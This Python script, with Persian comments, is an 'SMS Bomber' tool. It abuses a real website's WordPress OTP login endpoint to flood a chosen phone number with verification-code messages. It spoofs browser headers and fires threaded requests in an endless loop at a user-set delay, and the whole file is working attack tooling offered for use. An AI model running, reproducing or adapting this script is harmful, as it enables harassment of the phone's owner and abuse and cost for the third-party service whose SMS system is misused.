from threading import Thread
from time import sleep
import requests
import sys

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
p = '\033[35;1m'
a = '\033[0m'

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# ------------------------------
# Ilozi SMS Service
# ------------------------------

def ilozi(phone):
    url = "https://ilozi.com/wp-admin/admin-ajax.php"

    payload = {
        "action": "digits_forms_ajax",
        "type": "login",
        "digits": "1",
        "instance_id": "a15a96e438ca5771bfd748a1fdf98103",
        "action_type": "phone",
        "digits_phone": phone,  # شماره بدون +98 و صفر اول
        "login_digt_countrycode": "+98",
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36",
        "Referer": "https://ilozi.com/",
        "Accept": "*/*",
        "Origin": "https://ilozi.com",
        "Connection": "keep-alive",
    }

    session = requests.Session()
    try:
        # مرحله اول: گرفتن کوکی
        session.get("https://ilozi.com", headers=headers, timeout=5)

        # ارسال درخواست اصلی
        response = session.post(url, data=payload, headers=headers, timeout=5)

        if response.status_code == 200:
            # سایت ممکن است متن خاصی در پاسخ داشته باشد که نشان دهد موفق بوده
            if "success" in response.text.lower() or "sent" in response.text.lower():
                print(f"{g}(Ilozi) Code Sent to {phone}{a}")
                return True
            else:
                print(f"{y}[-] (Ilozi) Request OK but Code may not be sent{a}")
                return False
        else:
            print(f"{r}[-] (Ilozi) Failed, Status: {response.status_code}{a}")
            return False
    except Exception as e:
        print(f"{r}[!] Ilozi Exception: {e}{a}")
        return False

# ------------------------------
# SMS Bomber Core
# ------------------------------
def run_service(service, phone):
    try:
        service(phone)
    except Exception as e:
        print(f"{r}[!] {service.__name__} Exception: {e}{a}")

def Vip(phone, delay_time):
    services = [ilozi]
    print_slow(f"{p}╔═════[ SMS Bomber Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Services: {y}{len(services)}")
    print_slow(f"{g}Delay: {y}{delay_time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=run_service, args=(service, phone)).start()
                sleep(delay_time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] Bomber Stopped!{a}")

# ------------------------------
# Phone validation
# ------------------------------
from re import match, sub
def is_phone(phone: str):
    if match(r"^\d{10}$", phone):  # فقط 10 رقم
        return phone
    return False

# ------------------------------
# Menu
# ------------------------------
def main_menu():
    print_slow("""
╔════════════════════════════════╗
║       ⟬ Bomber Plus Tool ⟭    ║
╚════════════════════════════════╝
Choose an Option:
    [1] SMS Bomber
    [0] Exit
""")
    return input("Enter Choice: ")

def main():
    while True:
        choice = main_menu()
        if choice == "1":
            phone = input("Enter Phone (e.g. 9173644430): ")
            phone = is_phone(phone)
            if not phone:
                print("Invalid Phone!")
                continue
            try:
                delay_time = float(input("Delay (seconds, default 0.1): ") or 0.1)
            except ValueError:
                delay_time = 0.1
            Vip(phone, delay_time)
        elif choice == "0":
            print("Exiting...")
            break
        else:
            print("Invalid Choice!")

if __name__ == "__main__":
    main()
